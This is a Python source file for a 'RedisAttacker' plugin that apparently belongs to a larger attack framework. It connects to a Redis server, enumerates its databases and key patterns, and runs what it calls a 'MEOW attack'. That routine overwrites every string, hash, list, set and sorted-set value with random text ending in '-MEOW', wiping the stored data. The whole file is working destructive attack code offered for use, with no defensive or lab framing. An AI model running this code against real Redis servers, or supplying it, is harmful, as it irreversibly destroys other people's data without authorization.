import random
import string
import redis
from core.base_attacker import BaseAttacker

class RedisAttacker(BaseAttacker):
    """
    Redis implementation of the BaseAttacker.
    """

    @classmethod
    def get_service_name(cls):
        return "redis"

    @classmethod
    def get_default_port(cls):
        return 6379

    def connect(self):
        """
        Connect to Redis server.
        """
        try:
            # Create Redis connection
            if self.username and self.password:
                # Redis 6+ with ACL support
                self.client = redis.Redis(
                    host=self.host,
                    port=self.port,
                    username=self.username,
                    password=self.password,
                    decode_responses=True
                )
            elif self.password:
                # Redis with password only (AUTH)
                self.client = redis.Redis(
                    host=self.host,
                    port=self.port,
                    password=self.password,
                    decode_responses=True
                )
            else:
                # No authentication
                self.client = redis.Redis(
                    host=self.host,
                    port=self.port,
                    decode_responses=True
                )

            # Test connection
            self.client.ping()
            self.logger.info("Successfully connected to Redis")
            return self.client
        except Exception as e:
            self.logger.error(f"Failed to connect to Redis: {str(e)}")
            raise

    def get_databases(self):
        """
        In Redis, we use database indices (0-15 by default).
        Return list of database indices that contain keys.
        """
        databases = []

        # Check databases 0-15 (default Redis config)
        for db_index in range(16):
            try:
                # Switch to this database
                self.client.execute_command('SELECT', db_index)

                # Check if database has any keys
                if self.client.dbsize() > 0:
                    databases.append(str(db_index))
            except Exception as e:
                self.logger.warning(f"Could not access database {db_index}: {str(e)}")
                continue

        # Switch back to database 0
        self.client.execute_command('SELECT', 0)

        return databases if databases else ['0']  # Default to DB 0 if none found

    def get_collections(self, database):
        """
        Redis has no collections; keys are grouped by pattern.
        Returns key patterns (e.g., "user:*") as "collections".
        """
        # Switch to the specified database
        self.client.execute_command('SELECT', int(database))

        # Get all keys
        all_keys = self.client.keys('*')

        # Extract patterns (e.g., "user:1" -> "user:*")
        patterns = set()
        for key in all_keys:
            if ':' in key:
                prefix = key.split(':')[0]
                patterns.add(f"{prefix}:*")
            else:
                patterns.add(key)  # Single key without pattern

        return list(patterns) if patterns else []

    def random_alphanumeric(self, length=10):
        """
        Generate a random alphanumeric string.
        """
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def meow_data(self, database, collection):
        """
        Execute the MEOW attack on the specified key pattern.
        """
        # Switch to the specified database
        self.client.execute_command('SELECT', int(database))

        modified_count = 0

        # Get all keys matching the pattern
        if collection.endswith(':*'):
            keys = self.client.keys(collection)
        else:
            keys = [collection]  # Single key

        for key in keys:
            try:
                # Get the type of the key
                key_type = self.client.type(key)

                if key_type == 'string':
                    # Simple string value
                    random_chars = self.random_alphanumeric()
                    self.client.set(key, f"{random_chars}-MEOW")
                    modified_count += 1

                elif key_type == 'hash':
                    # Hash (like our user:X keys)
                    hash_fields = self.client.hgetall(key)
                    for field, value in hash_fields.items():
                        random_chars = self.random_alphanumeric()
                        self.client.hset(key, field, f"{random_chars}-MEOW")
                    modified_count += 1

                elif key_type == 'list':
                    # List - replace all elements
                    list_length = self.client.llen(key)
                    self.client.delete(key)
                    for i in range(list_length):
                        random_chars = self.random_alphanumeric()
                        self.client.rpush(key, f"{random_chars}-MEOW")
                    modified_count += 1

                elif key_type == 'set':
                    # Set - replace all members
                    members = self.client.smembers(key)
                    self.client.delete(key)
                    for _ in members:
                        random_chars = self.random_alphanumeric()
                        self.client.sadd(key, f"{random_chars}-MEOW")
                    modified_count += 1

                elif key_type == 'zset':
                    # Sorted set - replace all members (keep scores)
                    members = self.client.zrange(key, 0, -1, withscores=True)
                    self.client.delete(key)
                    for _, score in members:
                        random_chars = self.random_alphanumeric()
                        self.client.zadd(key, {f"{random_chars}-MEOW": score})
                    modified_count += 1

                else:
                    self.logger.warning(f"Unknown key type '{key_type}' for key '{key}'")

            except Exception as e:
                self.logger.warning(f"Failed to modify key '{key}': {str(e)}")
                continue

        self.logger.info(f"Modified {modified_count} keys in database {database} matching pattern {collection}")
        return modified_count

    def close(self):
        """
        Close the Redis connection.
        """
        if hasattr(self, 'client'):
            self.client.close()
            self.logger.info("Redis connection closed")
